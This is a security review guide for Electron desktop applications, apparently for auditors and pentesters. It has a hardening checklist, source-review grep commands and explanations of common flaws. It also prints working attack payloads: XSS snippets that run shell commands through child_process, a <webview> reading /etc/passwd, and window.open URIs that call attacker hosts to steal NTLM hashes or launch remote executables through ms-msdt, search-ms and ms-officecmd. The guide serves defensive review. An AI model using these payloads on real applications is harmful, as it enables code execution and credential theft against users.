**Disclaimer: It is still under research, this guide can be extended.**

# Security Review for Electron JS applications
- [Security Checklist](#security-checklist)
- [Review Methodology](#review-methodology)
	- [Getting Started](#getting-started)
	- [0-click client-side RCE due to disabled isolation](#0-click-client-side-rce-due-to-disabled-isolation)
	- [Reading Local Files through the `<webview>` tag](#reading-local-files-through-the-webview-tag)
	- [Phishing and credential harvesting (Loading Unsafe Remote Content)](#phishing-and-credential-harvesting-loading-unsafe-remote-content)
	- [1-click RCE or NTLM hash stealing through `shell.openExternal`](#1-click-rce-or-ntlm-hash-stealing-through-shellopenexternal)
- [Links and References](#links-and-references)

# Security Checklist

- [ ]  `loadURL` loads only `https://` links
- [ ]  `nodeIntegration` is disabled (`false`)
- [ ]  `contextIsolation` is enabled (`true`)
- [ ]  `sandbox` is enabled (`true`)
- [ ]  Permission request handlers are implemented (`.setPermissionRequestHandler`)
- [ ]  `webSecurity`  is enabled (`true`)
- [ ]  Content Security Policy (CSP) is defined
- [ ]  `allowRunningInsecureContent` is not used or is set to (`false`)
- [ ]  `experimentalFeatures` is disabled or not used (`false`)
- [ ]  `enableBlinkFeatures` is not used
- [ ]  `<webview>` tag does not use `allowpopups`
- [ ]  Application overwrites events `new-window` and `will-navigate`, and other event listeners
- [ ]  Application limits content to only from trusted origins (review navigation)
- [ ]  Verify WebView options before creation (reduce the attack vector for reading internal files through the `<webview>` tag)
- [ ]  Application limits the URL protocol before calling the `shell.openExternal` function invoke (`http://`, `https://`) or informs the user and provides a consent page that opening the next page can be a malicious action

# Review Methodology

## Getting Started

Electron JS desktop applications are packed in the `asar` format, to retrieve the source code of the client side, we need to unpack it:

**install asar**

```bash
npm install -g asar
```

**extract the source code** 

```bash
asar extract app.asar <OUT-FOLDER>
```

**repack the source code**

```bash
asar pack <FOLDER> app.asar
```

**proxy an electron application**

Look for `require("electron")` importing to find the global variable, add the next 2 lines below into the code and repack the source code:

```jsx
const electron = require("electron");
const app = electron.app;
app.commandLine.appendSwitch('proxy-server', '127.0.0.1:8080');
```

## 0-click client-side RCE due to disabled isolation

**For more details see the original research:** [**0-click RCE in Electron Applications**](https://shabarkin.medium.com/0-click-rce-in-electron-applications-1c4f81a2cd6b)

Look for `contextIsolation` and `nodeIntegration` options in any renderers ([BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window), [BrowserView](https://www.electronjs.org/docs/latest/api/browser-view), or [< webview >](https://www.electronjs.org/docs/latest/api/webview-tag)) that loads remote content. 

Prerequisites to straightforward RCE: 

`nodeIntegration` should be set to  `true`  (*Since in Electron version 5.0.0. the undefined* `nodeIntegration` *is set to `false` by default*)

`contextIsolation`  should be set to  `false`  (*Since in Electron version 12.0.0, the undefined `contextIsolation` is set to `true` by default*)

```bash
grep -HanrE "contextIsolation|nodeIntegration"
```

1. If the `nodeIntegration` is set to `true`, an attacker would need to find XSS in the main web application and use the following JS Code to achieve client-side remote code execution: 

```jsx
require("child_process").exec("uname -a",function(error,stdout,stderr){console.log(stdout);});
```

2. If the `contextIsolation` is set to `false`, an attacker would need to find XSS in the main web application and attack the built-in JavaScript functions or `preload:` scripts. 

**#preload_scripts:**

Identify functions in the preload scripts, which may satisfy the attack vector through XSS and use them in the JavaScript code of the malicious payload.

```jsx
#preload.js:
ElectronRequire = require; 
delete require;

#xss_payload:
ElectronRequire("child_process").exec("uname -a",function(error,stdout,stderr){console.log(stdout);});
```

**#prototype_overwrite:**

Review the code of the main renderer and identify where the built-in JavaScript function is used (`Array.prototype.join` or `String.prototype.indexOf` any other), 

```jsx
RegExp.prototype.test=function(){
    return false;
}
Array.prototype.join=function(){
    return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```

Example of the `getGPUDriverVersions` function:

```jsx
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== 'win32') {
    return {};
  }

  const result = {};
  const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
  } catch (e) {
    result.nvidia = {error: e.toString()};
  }

  return result;
};
```

## Reading Local Files through the `<webview>` tag

**For more details see the original research:** [****Facebook Messenger Desktop App Arbitrary File Read****](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)

If `contextIsolation` is set to `false`, you can try to use `<webview>` (similar to `<iframe>`, but it can load local files) to read local files and exfiltrate them: using something like  `<webview src="file:///etc/passwd"></webview>`


## Phishing and credential harvesting (Loading Unsafe Remote Content)

**For more details see the original research:** [****Phishing and credential harvesting in Electron applications****](https://medium.com/@shabarkin/unsafe-content-loading-electron-js-76296b6ac028)

When the desktop application loads remote content, it should ensure that it is loaded from the trusted origin. Usually, the application allows third-party web applications to be loaded in the desktop window. It is difficult to limit navigation, when the main web application uses multiple integrations or embeddings from third-party web apps, the limitations are commonly implemented:

Grep the source code for the following snippet: `webContents.on(` and review `new-window`, `will-navigate`, and other navigation listeners:

```jsx
grep -HanrE "webContents\.on\("
```

**Example #1** of vulnerable code snippet: (missing escaped character `.` in the regexp)

```jsx
function openInternally (url) {
		validInternalUrls = ".*((subdomain.google.com)|(subdomain.apple.com)).*" //etc...
    if (new RegExp(validInternalUrls, "i").test(url)) {
        return true;
    }

    return false;
}

mainWindow.webContents.on("new-window", (event, newUrl, frameName, disposition, options) => {
    if (!openInternally(newUrl)) {
      event.preventDefault();
      shell.openExternal(newUrl);

    } else {
      event.preventDefault();
      const newWindow = new BrowserWindow({
        parent: mainWindow,
      });
      newWindow.loadURL(newUrl)
    }});
```

The desktop app will load content in the desktop window from the following origin: 

`http://subdomainagoogleqcom.com`

**Example #2** of vulnerable code snippet: (Checks if strings in `allowedUrls` are included in the URL)

```jsx
mainWindow.webContents.on("new-window", (event, newUrl, frameName, disposition, options) => {
    const allowedUrls = ['oauth', 'drive','onedrive','google'];
    const openInWindow = allowedUrls.some(url => newUrl.includes(url));

    if (!openInWindow) {
      event.preventDefault();
      shell.openExternal(newUrl);

    } else {
      event.preventDefault();
      const oauthPopUp = new BrowserWindow({
        parent: mainWindow,
      });
      oauthPopUp.loadURL(newUrl)
    }
});
```

The desktop app will load content in the desktop window from the following origin: 

`http://anydomain.com/oauth`

More of the similar regular expressions could be implemented, exploitation requires manual review.

## 1-click RCE or NTLM hash stealing through `shell.openExternal`

**For more details see the original research:** [****1-click RCE in Electron Applications****](https://medium.com/@shabarkin/1-click-rce-in-electron-applications-79b52e1fe8b8)

Look for the usage of `shell.openExternal`, the URL parameter passed to the function should be user controlled. By reviewing the `new-window` event listener, most applications used `shell.openExternal` to open links in the browser, but the problem is that the URL protocol is not limited. When function `window.open("smb://malicious.com")` is invoked, the desktop application will enforce the device to start an smb connection to the malicious server, an attacker could steal the NTLM hashes of the user. This technique can be used in the Red Team activities.

Search for the sinks of the `shell.openExternal`:

```jsx
grep -HanrE "shell\.openExternal\("
```

The example of a vulnerable code snippet where `newUrl` is passed to `shell.openExternal(newUrl)` without limiting the URL protocol: 

```jsx
mainWindow.webContents.on("new-window", (event, newUrl, frameName, disposition, options) => {
    const allowedUrls = ['oauth', 'drive','onedrive','google'];
    const openInWindow = allowedUrls.some(url => newUrl.includes(url));

    if (!openInWindow) {
      event.preventDefault();
      shell.openExternal(newUrl);

    } else {
      event.preventDefault();
      const oauthPopUp = new BrowserWindow({
        parent: mainWindow,
      });
      oauthPopUp.loadURL(newUrl)
    }
});
```

These payloads are based on the example above (The application can use the `shell.openExternal` function in other places, thus you need to find the way to deliver the URL into the function): 

```jsx
1. HTLM Hash Stealing -> window.open("smb://malicious.com")
2. Client-side RCE #1 -> window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
3. Client-side RCE #2 -> window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](http://5cattacker.com/)%5Csmb_share%5Ctools&displayname=Important%20update")
4. Client-side RCE #3 -> window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
```

# Links and References
<details><summary>Links and References</summary><blockquote>

[Windows 10 RCE: The exploit is in the link | Positive Security](https://positive.security/blog/ms-officecmd-rce)

[The dangers of Electron's shell.openExternal()-many paths to remote code execution](https://benjamin-altpeter.de/shell-openexternal-dangers/#digging-deeper-into-how-shellopenexternal-actually-opens-urls)

[Security, Native Capabilities, and Your Responsibility | Electron](https://www.electronjs.org/docs/latest/tutorial/security#14-do-not-use-openexternal-with-untrusted-content)

[Build software better, together](https://github.com/wireapp/wire-desktop/security/advisories/GHSA-5gpx-9976-ggpm)

[Allow arbitrary URLs, expect arbitrary code execution | Positive Security](https://positive.security/blog/url-open-rce#windows-10-19042)

[webContents | Electron](https://www.electronjs.org/docs/latest/api/web-contents#event-new-window-deprecated)

[The dangers of Electron's shell.openExternal()-many paths to remote code execution](https://benjamin-altpeter.de/shell-openexternal-dangers/)

[Discord Desktop app RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

[XSS to RCE Electron Desktop Apps](https://book.hacktricks.xyz/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)

[Awesome Electron JS Hacking](https://github.com/doyensec/awesome-electronjs-hacking)

[Pentesting Electron Applications - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/exploitation/pentesting-electron-applications/)

[Hacking Electron Applications](https://www.youtube.com/watch?v=jkJWA_CWrQs)

[Adventures in Hacking Electron Apps](https://dev.to/essentialrandom/adventures-in-hacking-electron-apps-3bbm)

[](https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf)

[](https://doyensec.com/resources/Asia-19-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf)

[Pentesting Electron Applications](https://cornerpirate.com/2021/02/11/pentesting-electron-applications/)

[Setting up Custom Proxy for Electron Webview](https://supersami.medium.com/setting-up-custom-proxy-for-electron-webview-109d78ce5e17)

[](https://benjamin-altpeter.de/doc/thesis-electron.pdf)
</blockquote></details>

